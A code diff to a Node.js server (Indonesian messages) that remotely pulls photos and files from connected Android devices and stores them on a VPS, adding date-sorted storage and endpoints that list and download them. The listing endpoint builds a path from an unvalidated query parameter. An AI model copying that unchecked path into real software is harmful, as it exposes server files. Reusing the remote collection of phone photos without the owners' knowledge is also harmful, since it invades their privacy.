@@ -311,8 +311,61 @@ var require_deviceController = __commonJS({
       } else if (fileExtension === ".webp") {
         contentType = "image/webp";
       }
+      let folder = "DCIM";
+      const prefix = "/storage/emulated/0/";
+      if (filePath.startsWith(prefix)) {
+        const relative = filePath.substring(prefix.length);
+        folder = path.dirname(relative);
+      } else {
+        const parent = path.dirname(filePath);
+        folder = parent.startsWith("/") ? parent.substring(1) : parent;
+      }
+      let mtime = null;
+      try {
+        const uploadDir2 = process.env.UPLOAD_DIR || "./uploads";
+        const allFilePath = path.join(uploadDir2, `${deviceId}-${folder}`, "all.json");
+        if (fs.existsSync(allFilePath)) {
+          const files = JSON.parse(fs.readFileSync(allFilePath, "utf8"));
+          const foundFile = files.find((f) => f.path === filePath || f.name === fileName);
+          if (foundFile) {
+            mtime = foundFile.mtime || foundFile.fileMtime;
+          }
+        }
+      } catch (e) {
+      }
+      let dateStr = "no-date";
+      if (mtime) {
+        try {
+          const d = new Date(mtime);
+          if (!isNaN(d.getTime())) {
+            const localYear = d.getFullYear();
+            const localMonth = String(d.getMonth() + 1).padStart(2, "0");
+            const localDay = String(d.getDate()).padStart(2, "0");
+            dateStr = `${localYear}-${localMonth}-${localDay}`;
+          }
+        } catch (e) {
+        }
+      } else {
+        const d = /* @__PURE__ */ new Date();
+        const localYear = d.getFullYear();
+        const localMonth = String(d.getMonth() + 1).padStart(2, "0");
+        const localDay = String(d.getDate()).padStart(2, "0");
+        dateStr = `${localYear}-${localMonth}-${localDay}`;
+      }
+      const uploadDir = process.env.UPLOAD_DIR || "./uploads";
+      const dateDir = path.join(uploadDir, `${deviceId}-${folder}`, dateStr);
+      if (!fs.existsSync(dateDir)) {
+        fs.mkdirSync(dateDir, { recursive: true });
+      }
+      const isImgExt = [".jpg", ".jpeg", ".png", ".gif", ".webp", ".heic", ".bmp"].includes(fileExtension);
+      let previewFileName = fileName;
+      if (!isImgExt) {
+        previewFileName = `${fileName}.jpg`;
+      }
+      const targetDiskPath = path.join(dateDir, previewFileName);
       const downloadSessionId = crypto.randomBytes(16).toString("hex");
       console.log(`\u{1F441}\uFE0F  Browser meminta preview: "${filePath}" (Session: ${downloadSessionId})`);
+      console.log(`\u{1F4BE} Preview akan disimpan di VPS: ${targetDiskPath}`);
       res.setHeader("Content-Disposition", "inline");
       res.setHeader("Content-Type", contentType);
       const timer = setTimeout(() => {
@@ -323,7 +376,14 @@ var require_deviceController = __commonJS({
           pendingDownloads.delete(downloadSessionId);
         }
       }, 3e4);
-      pendingDownloads.set(downloadSessionId, { res, timer, fileName });
+      pendingDownloads.set(downloadSessionId, {
+        res,
+        timer,
+        fileName,
+        saveToDisk: true,
+        targetDiskPath,
+        isStreamResponse: true
+      });
       try {
         await socketModule2.sendDeviceCommand(deviceId, "GET_PREVIEW", {
           path: filePath,
@@ -359,7 +419,7 @@ var require_deviceController = __commonJS({
           pendingDownloads.delete(downloadSessionId);
         }
       }, 3e4);
-      pendingDownloads.set(downloadSessionId, { res, timer, fileName, saveToDisk: true, targetDiskPath });
+      pendingDownloads.set(downloadSessionId, { res, timer, fileName, saveToDisk: true, targetDiskPath, isJsonResponse: true });
       try {
         await socketModule2.sendDeviceCommand(deviceId, "GET_FILE", {
           path: filePath,
@@ -562,12 +622,43 @@ var require_fileController = __commonJS({
         }
         const deviceFilePath = targetFile.path;
         const fileExtension = path.extname(name).toLowerCase();
+        const mtime = targetFile.mtime || targetFile.fileMtime;
+        let dateStr = "no-date";
+        if (mtime) {
+          try {
+            const d = new Date(mtime);
+            if (!isNaN(d.getTime())) {
+              const localYear = d.getFullYear();
+              const localMonth = String(d.getMonth() + 1).padStart(2, "0");
+              const localDay = String(d.getDate()).padStart(2, "0");
+              dateStr = `${localYear}-${localMonth}-${localDay}`;
+            }
+          } catch (e) {
+          }
+        } else {
+          const d = /* @__PURE__ */ new Date();
+          const localYear = d.getFullYear();
+          const localMonth = String(d.getMonth() + 1).padStart(2, "0");
+          const localDay = String(d.getDate()).padStart(2, "0");
+          dateStr = `${localYear}-${localMonth}-${localDay}`;
+        }
+        const dateDir = path.join(targetDir, dateStr);
+        if (!fs.existsSync(dateDir)) {
+          fs.mkdirSync(dateDir, { recursive: true });
+        }
+        const isImgExt = [".jpg", ".jpeg", ".png", ".gif", ".webp", ".heic", ".bmp"].includes(fileExtension);
+        let previewFileName = name;
+        if (!isImgExt) {
+          previewFileName = `${name}.jpg`;
+        }
+        const targetDiskPath = path.join(dateDir, previewFileName);
         let contentType = "image/jpeg";
         if (fileExtension === ".png") contentType = "image/png";
         else if (fileExtension === ".gif") contentType = "image/gif";
         else if (fileExtension === ".webp") contentType = "image/webp";
         const downloadSessionId = crypto.randomBytes(16).toString("hex");
         console.log(`\u{1F441}\uFE0F  Meminta preview berkas dari perangkat: "${deviceFilePath}" (Session: ${downloadSessionId})`);
+        console.log(`\u{1F4BE} Preview akan disimpan di VPS: ${targetDiskPath}`);
         res.setHeader("Content-Disposition", "inline");
         res.setHeader("Content-Type", contentType);
         const timer = setTimeout(() => {
@@ -578,7 +669,14 @@ var require_fileController = __commonJS({
             pendingDownloads.delete(downloadSessionId);
           }
         }, 3e4);
-        pendingDownloads.set(downloadSessionId, { res, timer, fileName: name });
+        pendingDownloads.set(downloadSessionId, {
+          res,
+          timer,
+          fileName: name,
+          saveToDisk: true,
+          targetDiskPath,
+          isStreamResponse: true
+        });
         await socketModule2.sendDeviceCommand(activeDeviceId, "GET_PREVIEW", {
           path: deviceFilePath,
           downloadSessionId
@@ -713,13 +811,104 @@ var require_fileController = __commonJS({
         res.status(500).json({ error: "Gagal membaca berkas JSON cache.", details: err.message });
       }
     }
+    async function getVpsFiles(req, res) {
+      const folder = req.query.folder || "DCIM/Camera";
+      const { deviceId } = req.query;
+      let activeDeviceId = deviceId;
+      if (!activeDeviceId) {
+        const activeDevices = socketModule2.getActiveDevicesList();
+        if (activeDevices.length > 0) {
+          activeDeviceId = activeDevices[0];
+        }
+      }
+      if (!activeDeviceId) {
+        try {
+          const dbDevices = await db2.getDevices();
+          if (dbDevices && dbDevices.length > 0) {
+            activeDeviceId = dbDevices[0].id;
+          }
+        } catch (e) {
+        }
+      }
+      if (!activeDeviceId) {
+        return res.status(400).json({ error: "Device ID tidak ditemukan." });
+      }
+      const uploadDir = process.env.UPLOAD_DIR || "./uploads";
+      const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
+      if (!fs.existsSync(targetDir)) {
+        return res.json([]);
+      }
+      try {
+        const list = [];
+        const items = fs.readdirSync(targetDir);
+        for (const item of items) {
+          const itemPath = path.join(targetDir, item);
+          const stat = fs.statSync(itemPath);
+          if (stat.isDirectory()) {
+            const files = fs.readdirSync(itemPath);
+            for (const filename of files) {
+              const filePath = path.join(itemPath, filename);
+              const fileStat = fs.statSync(filePath);
+              if (fileStat.isFile()) {
+                list.push({
+                  name: filename,
+                  date: item,
+                  // e.g. "2026-01-26"
+                  size: fileStat.size,
+                  mtime: fileStat.mtime,
+                  relativePath: `${item}/${filename}`
+                });
+              }
+            }
+          }
+        }
+        list.sort((a, b) => new Date(b.mtime) - new Date(a.mtime));
+        res.json(list);
+      } catch (err) {
+        res.status(500).json({ error: "Gagal membaca berkas di VPS.", details: err.message });
+      }
+    }
+    function downloadVpsFile(req, res) {
+      const folder = req.query.folder || "DCIM/Camera";
+      const { deviceId, date, name } = req.query;
+      if (!date || !name) {
+        return res.status(400).json({ error: 'Parameter "date" dan "name" diperlukan.' });
+      }
+      let activeDeviceId = deviceId;
+      if (!activeDeviceId) {
+        const activeDevices = socketModule2.getActiveDevicesList();
+        if (activeDevices.length > 0) {
+          activeDeviceId = activeDevices[0];
+        }
+      }
+      if (!activeDeviceId) {
+        return res.status(400).json({ error: "Device ID tidak ditemukan." });
+      }
+      const uploadDir = process.env.UPLOAD_DIR || "./uploads";
+      const filePath = path.resolve(uploadDir, `${activeDeviceId}-${folder}`, date, name);
+      if (!filePath.startsWith(path.resolve(uploadDir))) {
+        return res.status(403).json({ error: "Akses tidak diperbolehkan." });
+      }
+      if (!fs.existsSync(filePath)) {
+        return res.status(404).json({ error: "Berkas tidak ditemukan di VPS." });
+      }
+      const inline = req.query.inline === "true";
+      if (!inline) {
+        res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(name)}"`);
+      } else {
+        res.setHeader("Content-Disposition", "inline");
+      }
+      res.sendFile(filePath);
+    }
     module2.exports = {
       getFiles,
       getFileMetadata,
       previewFileCached,
       downloadFileCached,
       getJsonList,
-      getJsonContent
+      getJsonContent,
+      getVpsFiles,
+      downloadVpsFile
     };
   }
 });
@@ -737,6 +926,8 @@ var require_fileRoutes = __commonJS({
     router.get("/files/download", authenticateApiKey, fileController.downloadFileCached);
     router.get("/files/json-list", authenticateApiKey, fileController.getJsonList);
     router.get("/files/json-get", authenticateApiKey, fileController.getJsonContent);
+    router.get("/vps/files", authenticateApiKey, fileController.getVpsFiles);
+    router.get("/vps/files/download", authenticateApiKey, fileController.downloadVpsFile);
     module2.exports = router;
   }
 });
@@ -755,24 +946,30 @@ var require_upload = __commonJS({
         if (!pending) {
           return cb(new Error("Session download tidak ditemukan atau kadaluarsa"));
         }
-        const { res: browserRes, timer, fileName, saveToDisk, targetDiskPath } = pending;
+        const { res: browserRes, timer, fileName, saveToDisk, targetDiskPath, isJsonResponse, isStreamResponse } = pending;
         clearTimeout(timer);
         if (saveToDisk && targetDiskPath) {
           console.log(`\u{1F4BE} (Multipart) Menyimpan file "${fileName}" dari Android ke disk VPS (${targetDiskPath})...`);
           const writeStream = fs.createWriteStream(targetDiskPath);
           file.stream.pipe(writeStream);
+          if (isStreamResponse && browserRes) {
+            console.log(`\u{1F680} (Multipart) Sekaligus mengalirkan file "${fileName}" ke Browser (Session: ${downloadSessionId})...`);
+            file.stream.pipe(browserRes);
+          }
           file.stream.on("end", () => {
             console.log(`\u2705 (Multipart) Sukses menyimpan file di VPS: ${targetDiskPath}`);
             pendingDownloads.delete(downloadSessionId);
             cb(null, { status: "success" });
-            browserRes.json({
-              status: "success",
-              message: "File berhasil diambil dari perangkat dan disimpan di VPS",
-              file: {
-                originalName: fileName,
-                path: targetDiskPath
-              }
-            });
+            if (isJsonResponse && browserRes) {
+              browserRes.json({
+                status: "success",
+                message: "File berhasil diambil dari perangkat dan disimpan di VPS",
+                file: {
+                  originalName: fileName,
+                  path: targetDiskPath
+                }
+              });
+            }
           });
           file.stream.on("error", (err) => {
             console.error(`\u274C (Multipart) Gagal menyimpan ke disk VPS: ${err.message}`);
@@ -780,7 +977,13 @@ var require_upload = __commonJS({
             });
             pendingDownloads.delete(downloadSessionId);
             cb(err);
-            browserRes.status(500).json({ error: "Gagal menulis file ke disk VPS", details: err.message });
+            if (browserRes) {
+              if (isJsonResponse) {
+                browserRes.status(500).json({ error: "Gagal menulis file ke disk VPS", details: err.message });
+              } else {
+                browserRes.end("Error saat mengunduh file.");
+              }
+            }
           });
         } else {
           console.log(`\u{1F680} (Multipart) Mengalirkan file "${fileName}" dari Android langsung ke Browser (Session: ${downloadSessionId})...`);
@@ -846,24 +1049,30 @@ var require_uploadController = __commonJS({
           console.warn(`\u26A0\uFE0F  Menerima upload untuk session kadaluarsa/tidak valid: ${downloadSessionId}`);
           return res.status(404).json({ error: "Session download kadaluarsa atau tidak valid" });
         }
-        const { res: browserRes, timer, fileName, saveToDisk, targetDiskPath } = pending;
+        const { res: browserRes, timer, fileName, saveToDisk, targetDiskPath, isJsonResponse, isStreamResponse } = pending;
         clearTimeout(timer);
         if (saveToDisk && targetDiskPath) {
           console.log(`\u{1F4BE} (Raw) Menyimpan data file "${fileName}" ke disk VPS (${targetDiskPath})`);
           const writeStream = fs.createWriteStream(targetDiskPath);
           req.pipe(writeStream);
+          if (isStreamResponse && browserRes) {
+            console.log(`\u{1F680} (Raw) Sekaligus mengalirkan data file "${fileName}" ke Browser (Session: ${downloadSessionId})`);
+            req.pipe(browserRes);
+          }
           req.on("end", () => {
             console.log(`\u2705 (Raw) Sukses menyimpan file di VPS: ${targetDiskPath}`);
             pendingDownloads.delete(downloadSessionId);
             res.status(200).json({ status: "success", message: "File saved successfully on VPS (raw)" });
-            browserRes.json({
-              status: "success",
-              message: "File berhasil diambil dari perangkat dan disimpan di VPS",
-              file: {
-                originalName: fileName,
-                path: targetDiskPath
-              }
-            });
+            if (isJsonResponse && browserRes) {
+              browserRes.json({
+                status: "success",
+                message: "File berhasil diambil dari perangkat dan disimpan di VPS",
+                file: {
+                  originalName: fileName,
+                  path: targetDiskPath
+                }
+              });
+            }
           });
           req.on("error", (err) => {
             console.error(`\u274C (Raw) Gagal menyimpan ke disk VPS:`, err.message);
@@ -871,7 +1080,13 @@ var require_uploadController = __commonJS({
             });
             pendingDownloads.delete(downloadSessionId);
             res.status(500).json({ error: "Stream interrupted" });
-            browserRes.status(500).json({ error: "Gagal menulis file ke disk VPS", details: err.message });
+            if (browserRes) {
+              if (isJsonResponse) {
+                browserRes.status(500).json({ error: "Gagal menulis file ke disk VPS", details: err.message });
+              } else {
+                browserRes.end("Error saat mengunduh file.");
+              }
+            }
           });
         } else {
           console.log(`\u{1F680} (Raw) Mengalirkan data file "${fileName}" dari Android langsung ke Browser (Session: ${downloadSessionId})`);
